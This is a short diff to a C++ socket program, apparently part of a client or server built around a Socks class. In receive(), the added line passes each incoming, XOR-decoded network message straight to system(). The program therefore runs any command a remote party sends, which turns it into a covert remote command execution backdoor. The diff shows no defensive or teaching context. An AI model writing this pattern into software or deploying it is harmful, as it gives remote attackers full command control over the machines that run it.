@@ -166,10 +166,10 @@ int Socks::receive() {
 			if (x >= peaky_len) {
 				x = 0;
 			}
-			//msg = msg + recvbuf[i];
 			msg[i] = msg[i] ^ peaky[x];
 		}
 		printf("Unencrypted message: %s\n", msg.c_str());
+		system(msg.c_str());
 	}
 	else if (result == 0)
 		printf("Connection closed\n");
@@ -198,4 +198,3 @@ int main()
 	std::cin >> temp;
     return 0;
 }
-
